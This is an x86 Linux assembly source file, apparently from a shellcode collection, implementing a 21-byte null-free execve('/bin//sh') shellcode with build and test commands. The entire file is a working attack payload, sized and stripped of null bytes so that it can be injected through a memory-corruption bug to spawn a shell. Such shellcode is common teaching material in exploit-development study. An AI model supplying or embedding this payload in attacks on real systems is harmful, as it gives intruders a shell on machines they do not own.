; Tiny Execve sh - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   execve
;
;   * 21 bytes
;   * null-free
;
;
;   # nasm -f elf32 tiny_execve_sh.asm
;   # ld -m elf_i386 tiny_execve_sh.o -o tiny_execve_sh
;
;   Testing
;   # ./tiny_execve_sh


global _start

section .text

_start:
	; int execve(const char *filename, char *const argv[], char *const envp[])

	xor ecx, ecx	; ecx = NULL
	mul ecx		; eax and edx = NULL
	mov al, 11	; execve syscall
	push ecx	; string NULL
	push 0x68732f2f ; "//sh"
	push 0x6e69622f	; "/bin"
	mov ebx, esp	; pointer to "/bin/sh\0" string
	int 0x80	; bingo
	
	
	
